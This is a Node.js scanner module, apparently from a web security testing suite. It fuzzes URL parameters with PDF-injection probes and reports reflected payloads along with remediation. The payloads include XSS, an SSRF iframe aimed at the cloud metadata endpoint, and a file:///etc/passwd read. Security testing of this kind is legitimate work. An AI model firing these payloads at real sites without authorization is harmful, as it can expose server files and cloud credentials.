#!/usr/bin/env node
'use strict';
/**
 * ╔════════════════════════════════════════════════════════════════════════════╗
 * ║ WebArsenal v5.5.0 "Pulse" - Advanced Security Suite                          ║
 * ║ De{c0}ded by Edwin Dev                                                      ║
 * ║ Module: pdf-injection-tester.js                                                          ║
 * ╚════════════════════════════════════════════════════════════════════════════╝
 */




const axios = require('axios');
const { getModuleById } = require('../lib/module-catalog');
const { parseArgs } = require('../lib/module-runner');
const { HttpHistoryLogger } = require('../utils/http-history-logger');

const definition = getModuleById('vuln-probes/pdf-injection-tester');
const historyLogger = new HttpHistoryLogger();

async function run(argv = process.argv) {
  const { flags } = parseArgs(argv.slice(2));
  const url = flags.url;

  if (!url) {
    console.log(`Usage: node ${definition.filePath} --url <target-url-with-params>`);
    return;
  }

  const parsedUrl = new URL(url);
  const params = Array.from(parsedUrl.searchParams.keys());

  if (params.length === 0) {
    console.log('[-] No parameters found in URL to fuzz.');
    return;
  }

  console.log(`[*] Probing PDF Injection on ${url} across ${params.length} parameters...`);
  const findings = [];
  const pdfPayloads = [
    { payload: '<img src=x onerror=alert(1)>', description: 'HTML-based XSS injection' },
    { payload: '<iframe src=http://169.254.169.254/latest/meta-data/>', description: 'Iframe-based SSRF' },
    { payload: '<link rel=attachment href="file:///etc/passwd">', description: 'Attachment-based LFI' },
    { payload: '{{ 7*7 }}', description: 'Template injection (Jinja2/Liquid)' }
  ];

  for (const param of params) {
    for (const p of pdfPayloads) {
      const fuzzUrl = new URL(url);
      fuzzUrl.searchParams.set(param, p.payload);

      try {
        const startTime = Date.now();
        const response = await axios.get(fuzzUrl.toString(), { timeout: 10000, validateStatus: () => true });
        const duration = Date.now() - startTime;

        historyLogger.logRequest({
          tool: definition.id,
          method: 'GET',
          url: fuzzUrl.toString(),
          requestHeaders: {},
          statusCode: response.status,
          responseHeaders: response.headers,
          responseBody: typeof response.data === 'string' ? response.data : JSON.stringify(response.data),
          durationMs: duration
        });

        const body = String(response.data || '').toLowerCase();
        if (body.includes(p.payload.toLowerCase())) {
          findings.push({
            title: `Potential PDF Injection (${p.description})`,
            severity: 'Medium',
            target: fuzzUrl.toString(),
            tool: definition.id,
            cvss: '6.5',
            evidence: {
              request: `GET ${fuzzUrl.toString()}`,
              response: `Injected HTML/template tag reflected in response body.`
            },
            remediation: 'Sanitize all input reflected in PDF documents. Disable JavaScript, external file access, and network access in the PDF generation engine (e.g., wkhtmltopdf, Puppeteer, or mPDF).'
          });
          console.log(`[!] POSSIBLE PDF INJECTION: ${fuzzUrl.toString()}`);
          break;
        }
      } catch (err) {
        // Skip
      }
    }
  }

  if (findings.length > 0) {
    console.log(`[+] Found ${findings.length} PDF issues!`);
    process.stdout.write(JSON.stringify(findings, null, 2) + '\n');
  } else {
    console.log('[-] No obvious PDF injection detected via reflection.');
  }

  return findings;
}

if (require.main === module) {
  run().catch(console.error);
}

module.exports = { run };
